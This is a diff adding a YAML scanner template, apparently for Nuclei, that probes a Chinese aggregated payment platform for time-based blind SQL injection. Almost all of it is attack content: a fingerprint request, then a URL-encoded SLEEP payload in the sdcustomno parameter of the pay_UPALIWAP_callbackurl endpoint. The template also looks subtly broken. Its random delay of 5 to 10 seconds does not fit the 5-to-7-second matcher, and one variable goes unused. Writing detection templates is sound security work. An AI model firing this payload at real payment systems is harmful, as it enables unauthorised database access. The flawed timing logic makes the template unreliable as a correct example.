@@ -1,0 +1,45 @@
+id: poc-yaml-aggregation-payment-sdcustomno-sqli
+info:
+  name: 聚合支付平台 sdcustomno SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    聚合支付平台 is vulnerable to SQL injection via the sdcustomno parameter in the pay_UPALIWAP_callbackurl endpoint.
+  metadata:
+    finger: 聚合支付平台
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1) + 2}}"
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "/Public/theme/view4/css/style.css"
+  - raw:
+      - |
+        GET /pay_UPALIWAP_callbackurl?sdcustomno=%27)%20AND%20(SELECT%202941%20FROM%20(SELECT(SLEEP({{t1}})))OCiy)%20AND%20(%27KPIR%27=%27KPIR HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "ok"
+      - type: dsl
+        dsl:
+          - "duration > 5 && duration < 7"
